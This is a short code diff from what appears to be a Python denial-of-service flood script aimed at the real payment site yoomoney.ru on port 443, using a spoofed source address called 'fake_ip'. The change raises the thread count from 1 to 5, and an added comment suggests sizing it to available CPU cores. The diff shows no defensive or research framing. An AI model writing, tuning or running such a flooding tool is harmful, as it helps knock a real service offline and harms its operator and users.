@@ -5,7 +5,8 @@ import threading
 target = 'yoomoney.ru'
 fake_ip = '217.107.219.57'
 port = 443
-max_threads = 1
+# check before how many cores you have and use about 25% of max thread available
+max_threads = 5
 
 hostname = socket.gethostname()
 ip = socket.gethostbyname(hostname)
